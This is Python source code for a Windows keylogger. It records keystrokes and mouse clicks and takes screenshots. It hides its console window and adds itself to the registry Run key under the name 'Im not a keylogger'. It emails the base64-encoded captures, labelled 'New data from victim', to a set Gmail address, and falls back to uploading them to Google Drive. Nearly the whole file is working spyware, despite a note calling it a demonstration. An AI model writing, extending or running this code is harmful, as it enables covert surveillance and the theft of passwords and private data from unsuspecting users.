"""
  _________   ___     ___   ____  ____ _____ ____  
| |/ / ____\ \ / / |   / _ \ / ___|/ ___| ____|  _ \ 
| ' /|  _|  \ V /| |  | | | | |  _| |  _|  _| | |_) |
| . \| |___  | | | |__| |_| | |_| | |_| | |___|  _ < 
|_|\_\_____| |_| |_____\___/ \____|\____|_____|_| \_\
"""
"""
Notice: 


Could do better in the future and improve: email functionality might fail but its only really written for demonstration, 
potentially crash when taking ss, could have issues  between runs. 

"""


import sys
import os
import time
import win32api
import win32console
import win32gui
import smtplib
import base64
import random
import string
import winreg
from pynput import keyboard, mouse
from datetime import datetime

#  variables
LOG_FILE = "keylog.txt"
ACTIVE_FILE = "active.flag"
yourgmail = "yourgmail@gmail.com"  # Replace with your Gmail
yourgmailpass = "yourpassword"    # Replace with your Gmail password
sendto = "recipient@gmail.com"    # Replace with recipient's email
interval = 60                     # Time interval in seconds to send logs which might be seen as spam idk 
t = ""
start_time = time.time()
pics_names = []

# Hotkey to toggle logging
HOTKEY = {keyboard.Key.ctrl_l, keyboard.Key.shift, keyboard.KeyCode(char='x')}
pressed_keys = set()

# Global listeners for proper shutdown
keyboard_listener = None
mouse_listener = None
hotkey_listener = None

def write_active_state(state):
    """Sets the keylogger's active state ('ON' or 'OFF')."""
    with open(ACTIVE_FILE, "w") as f:
        f.write(state)

def read_active_state():
    """Checks if the keylogger is active ('ON' or 'OFF')."""
    if not os.path.exists(ACTIVE_FILE):
        write_active_state("OFF")  # Create the file if missing
    with open(ACTIVE_FILE, "r") as f:
        return f.read().strip()

def handle_user_input():
    """Processes user commands: start, stop, clear, status."""
    global keyboard_listener, mouse_listener, hotkey_listener
    
    if len(sys.argv) < 2:
        print("Usage: python keylogger.py <start|stop|clear|status>")
        return  # Instead of exiting, just return

    command = sys.argv[1].lower()

    if command == "start":
        write_active_state("ON")
        print("Keylogger activated.")

    elif command == "stop":
        write_active_state("OFF")
        print("Keylogger deactivated.")
        
        # Stop listeners properly
        if keyboard_listener and hasattr(keyboard_listener, 'running') and keyboard_listener.running:
            keyboard_listener.stop()
        if mouse_listener and hasattr(mouse_listener, 'running') and mouse_listener.running:
            mouse_listener.stop()
        if hotkey_listener and hasattr(hotkey_listener, 'running') and hotkey_listener.running:
            hotkey_listener.stop()
            
        sys.exit(0)  # Ensure script terminates after stopping

    elif command == "clear":
        if os.path.exists(LOG_FILE):
            os.remove(LOG_FILE)
        print("Keylog file cleared.")
        return  # Return instead of exiting

    elif command == "status":
        print(f"Keylogger is currently: {read_active_state()}")
        return  # Return instead of exiting

    else:
        print("Invalid command. Use start, stop, clear, or status.")

def check_if_active():
    """Checks if the keylogger is active before continuing."""
    if read_active_state() == "ON":
        print("Keylogger is active, continuing script execution...")
        return True
    else:
        print("Keylogger is inactive. Exiting.")
        sys.exit(0)  # Stop execution if not active

def addStartup():
    """Adds the keylogger to the Windows startup registry."""
    try:
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
    except FileNotFoundError:
        key2change = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)

    winreg.SetValueEx(key2change, 'Im not a keylogger', 0, winreg.REG_SZ, os.path.realpath(sys.argv[0]))
    winreg.CloseKey(key2change)

def Hide():
    """Hides the console window safely."""
    win = win32console.GetConsoleWindow()
    if win:  # Only hide if a window exists
        win32gui.ShowWindow(win, 0)

def ScreenShot():
    """Takes a screenshot and saves it with a random name."""
    global pics_names
    import pyautogui
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    name = str(generate_name())
    pics_names.append(name)
    pyautogui.screenshot().save(name + '.png')

def Mail_it(data, pics_names):
    """Sends the logged data and screenshots via email in a single email session."""
    try:
        data = base64.b64encode(data.encode()).decode()
        email_body = 'New data from victim (Base64 encoded)\n' + data
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.sendmail(yourgmail, sendto, email_body)

        # Send all screenshots in one session
        for pic in pics_names:
            if os.path.exists(pic + '.png'):
                with open(pic + '.png', 'rb') as f:
                    pic_data = base64.b64encode(f.read()).decode()
                email_body = 'New pic data from victim (Base64 encoded)\n' + pic_data
                server.sendmail(yourgmail, sendto, email_body)
                # Remove the screenshot after sending
                os.remove(pic + '.png')

        server.quit()  # Close SMTP session after all files are sent
        # Clear the pics_names list after sending
        pics_names.clear()
    except Exception as e:
        # Log the error and try the alternative upload method
        with open("mail_error.log", "a") as f:
            f.write(f"Error sending email: {str(e)}\n")
        try:
            upload_to_gdrive(data, pics_names)
        except:
            pass

def upload_to_gdrive(data, pics_names):
    """Uploads keylog data and screenshots to Google Drive."""
    try:
        from pydrive.auth import GoogleAuth
        from pydrive.drive import GoogleDrive
        
        # Save data to a temporary file
        temp_log = f"temp_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(temp_log, "w") as f:
            f.write(data)
            
        # Authenticate and create drive object
        gauth = GoogleAuth()
        # Use saved credentials if available
        gauth.LoadCredentialsFile("credentials.json")
        if gauth.credentials is None:
            gauth.LocalWebserverAuth()
        elif gauth.access_token_expired:
            gauth.Refresh()
        else:
            gauth.Authorize()
        gauth.SaveCredentialsFile("credentials.json")
        
        drive = GoogleDrive(gauth)
        
        # Upload log file
        upload_file = drive.CreateFile({'title': os.path.basename(temp_log)})
        upload_file.SetContentFile(temp_log)
        upload_file.Upload()
        
        # Upload screenshots
        for pic in pics_names:
            if os.path.exists(pic + '.png'):
                upload_pic = drive.CreateFile({'title': pic + '.png'})
                upload_pic.SetContentFile(pic + '.png')
                upload_pic.Upload()
                # Remove the screenshot after uploading
                os.remove(pic + '.png')
                
        # Clean up
        os.remove(temp_log)
        pics_names.clear()
    except Exception as e:
        with open("gdrive_error.log", "a") as f:
            f.write(f"Error uploading to Google Drive: {str(e)}\n")

def on_press(key):
    """Logs keyboard events and stops listener if keylogger is deactivated."""
    if read_active_state() == "OFF":
        print("Keylogger stopping...")
        return False  # Properly stops the listener

    global t, start_time
    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)

    data = f'\n[{time.ctime()}] Key Pressed: {key_char}'
    t += data

    # Check if it's time to rotate logs
    rotate_log_file()

    if len(t) > 1000:  # Wait until enough data has accumulated
        Mail_it(t, pics_names)
        start_time = time.time()
        t = ''

    return True  # This ensures the listener continues working correctly

def on_click(x, y, button, pressed):
    """Logs mouse click events and stops listener if keylogger is deactivated."""
    if read_active_state() == "OFF":
        print("Keylogger stopping...")
        return False  # Stops the listener properly

    global t, start_time, pics_names
    if pressed:
        data = f'\n[{time.ctime()}] Mouse Clicked at: ({x}, {y}) with Button: {button}'
        t += data

        if len(t) > 300:
            ScreenShot()

        # Check if it's time to rotate logs
        rotate_log_file()

        if len(t) > 1000:  # Wait until enough data has accumulated
            Mail_it(t, pics_names)
            start_time = time.time()
            t = ''

    return True  # Ensure listener continues

def on_press_hotkey(key):
    """Detects the hotkey to toggle keylogger ON/OFF."""
    if key in HOTKEY:
        pressed_keys.add(key)
        if pressed_keys == HOTKEY:
            toggle_logging()

def on_release_hotkey(key):
    """Removes the key from the set when released."""
    if key in HOTKEY:
        pressed_keys.remove(key)

def toggle_logging():
    """Toggles logging ON or OFF when hotkey is pressed."""
    if read_active_state() == "ON":
        write_active_state("OFF")
        print("Keylogger deactivated.")
    else:
        write_active_state("ON")
        print("Keylogger activated.")

def rotate_log_file():
    """Creates a new log file every day and archives the old one."""
    global LOG_FILE
    today = datetime.now().strftime("%Y-%m-%d")
    new_log_file = f"keylog_{today}.txt"
    if LOG_FILE != new_log_file:
        if os.path.exists(LOG_FILE):  # Archive old logs
            archive_name = f"{LOG_FILE}.{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            os.rename(LOG_FILE, archive_name)
            # = could also upload the archived log here
            with open(archive_name, 'r') as f:
                archived_data = f.read()
            Mail_it(archived_data, [])
        LOG_FILE = new_log_file
        # Creatse the new log file with header
        with open(LOG_FILE, 'w') as f:
            f.write(f"=== Keylog started {datetime.now()} ===\n")

def main():
    """Main function to set up and run the keylogger."""
    global keyboard_listener, mouse_listener, hotkey_listener
    
    handle_user_input()
    if read_active_state() == "OFF":
        return  # Exitss if keylogger is not active

    addStartup()
    Hide()

    # Setsup keyboard and mouse listeners
    keyboard_listener = keyboard.Listener(on_press=on_press)
    mouse_listener = mouse.Listener(on_click=on_click)

    # Setsup hotkey listener
    hotkey_listener = keyboard.Listener(on_press=on_press_hotkey, on_release=on_release_hotkey)

    keyboard_listener.start()
    mouse_listener.start()
    hotkey_listener.start()

    keyboard_listener.join()
    mouse_listener.join()
    hotkey_listener.join()

if __name__ == "__main__":
    main()
